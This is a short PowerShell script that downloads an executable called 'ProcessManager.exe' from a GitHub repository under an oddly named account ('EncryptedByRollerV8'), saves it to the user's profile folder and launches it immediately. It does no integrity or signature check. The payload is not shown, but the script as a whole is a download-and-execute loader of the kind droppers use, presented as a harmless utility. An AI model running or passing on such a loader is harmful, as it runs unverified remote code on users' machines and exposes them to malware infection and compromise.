# Get the correct user folder path - works on all Windows versions
$userFolder = [Environment]::GetFolderPath("UserProfile")
$destination = Join-Path -Path $userFolder -ChildPath "ProcessManager.exe"

Write-Host "User folder detected: $userFolder"
Write-Host "File will be saved to: $destination"

# Download URL
$url = "https://github.com/EncryptedByRollerV8/f/raw/main/ProcessManager.exe"

try {
    # Download the file
    Write-Host "Downloading..."
    Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing
    
    if (Test-Path $destination) {
        Write-Host "Success! File saved to: $destination"
        
        # Run the file
        Write-Host "Starting ProcessManager..."
        Start-Process -FilePath $destination
        Write-Host "Application started!"
    } else {
        Write-Host "Error: Download failed"
    }
}
catch {
    Write-Host "Error: $($_.Exception.Message)"
}

Write-Host "Press any key to close..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
